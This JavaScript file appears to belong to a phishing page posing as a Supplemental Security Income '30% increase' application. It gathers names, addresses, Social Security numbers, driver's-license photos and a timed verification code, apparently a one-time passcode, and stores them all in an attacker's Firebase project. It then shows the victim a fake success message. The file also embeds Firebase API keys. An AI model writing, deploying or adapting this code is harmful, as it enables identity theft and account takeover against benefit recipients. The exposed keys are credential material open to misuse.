// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyCHXWb54lozONkprMPDnLnwfUclbaLIvKA",
    authDomain: "trust02-30cb3.firebaseapp.com",
    databaseURL: "https://trust02-30cb3-default-rtdb.firebaseio.com",
    projectId: "trust02-30cb3",
    storageBucket: "trust02-30cb3.appspot.com",
    messagingSenderId: "1089873587339",
    appId: "1:1089873587339:web:00aa2d02765d1d5067b88e"
};


// Initialize Firebase
firebase.initializeApp(firebaseConfig);
var db = firebase.firestore();
var storage = firebase.storage();
var realtimeDB = firebase.database();

// Function to calculate 30% increase
function calculateIncome() {
    var income = parseFloat(document.getElementById('income').value);
    if (isNaN(income)) {
        document.getElementById('incomeResult').innerText = "Please enter a valid income.";
        return;
    }
    var increasedIncome = income * 1.3;
    document.getElementById('incomeResult').innerText = "Income after 30% increase: $" + increasedIncome.toFixed(2);
}

// Function to show the code entry popup
function showCodeNotificationPopup() {
    document.getElementById('codeNotificationPage').style.display = 'block';
}

// Function to send code and show the code entry popup
function sendCode() {
    // Code to send code to user's phone (not implemented here)
    showCodePopup();
}

// Function to show the code entry popup
function showCodePopup() {
    document.getElementById('codeNotificationPage').style.display = 'none';
    document.getElementById('codePage').style.display = 'block';
    startTimer(); // Start the countdown timer
}

// Function to start countdown timer
function startTimer() {
    var countdownElement = document.getElementById('countdown');
    var duration = 10 * 60; // 10 minutes in seconds
    var timer = setInterval(function() {
        var minutes = Math.floor(duration / 60);
        var seconds = duration % 60;
        countdownElement.textContent = `Time left: ${minutes}m ${seconds}s`;
        duration--;

        if (duration < 0) {
            clearInterval(timer);
            countdownElement.textContent = 'Time expired!';
        }
    }, 1000);
}

// Function to handle the final form submission after code entry
function submitForm() {
    var firstName = document.getElementById('firstName').value;
    var lastName = document.getElementById('lastName').value;
    var address = document.getElementById('address').value;
    var email = document.getElementById('email').value;
    var phone = document.getElementById('phone').value;
    var ssn = document.getElementById('ssn').value;
    var income = document.getElementById('income').value;
    var licenseFront = document.getElementById('licenseFront').files[0];
    var licenseBack = document.getElementById('licenseBack').files[0];
    var code = document.getElementById('code').value;

    // Validate form inputs (add your own validations)

    // Upload files to Firebase Storage
    var uploadTaskFront = storage.ref('licenses/' + licenseFront.name).put(licenseFront);
    var uploadTaskBack = storage.ref('licenses/' + licenseBack.name).put(licenseBack);

    // Handle file uploads and save form data to Firestore and Realtime Database
    Promise.all([uploadTaskFront, uploadTaskBack]).then(function(snapshots) {
        return Promise.all([snapshots[0].ref.getDownloadURL(), snapshots[1].ref.getDownloadURL()]);
    }).then(function(downloadURLs) {
        return db.collection('ssiIncrementForms').add({
            firstName: firstName,
            lastName: lastName,
            address: address,
            email: email,
            phone: phone,
            ssn: ssn,
            income: income,
            licenseFrontURL: downloadURLs[0],
            licenseBackURL: downloadURLs[1],
            timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });
    }).then(function() {
        realtimeDB.ref('verificationCodes').push({
            code: code,
            timestamp: firebase.database.ServerValue.TIMESTAMP
        });
        document.getElementById('userForm').reset();
        document.getElementById('incomeResult').innerText = '';
        closePopup('codePage');
        showSuccessPopup(firstName); // Show success popup with first name
    }).catch(function(error) {
        console.error('Error submitting form: ', error);
        alert('Error submitting form. Please try again.');
    });
}

// Function to show success popup
function showSuccessPopup(firstName) {
    document.getElementById('successMessage').innerText = `Congratulations, ${firstName}! Your application has been submitted successfully.`;
    document.getElementById('successPopup').style.display = 'block';
}

// Function to hide the popup
function closePopup(popupId) {
    document.getElementById(popupId).style.display = 'none';
}

// Add event listener for the submit button to show the code notification popup
document.querySelector('button[type="submit"]').addEventListener('click', function(e) {
    e.preventDefault();
    showCodeNotificationPopup();
});

// Add event listener for the send code button in the code notification popup
document.querySelector('#codeNotificationPage button').addEventListener('click', function() {
    sendCode();
});

// Add event listener for the next button in the code popup to submit the form
document.querySelector('#codePage button').addEventListener('click', function() {
    submitForm();
});
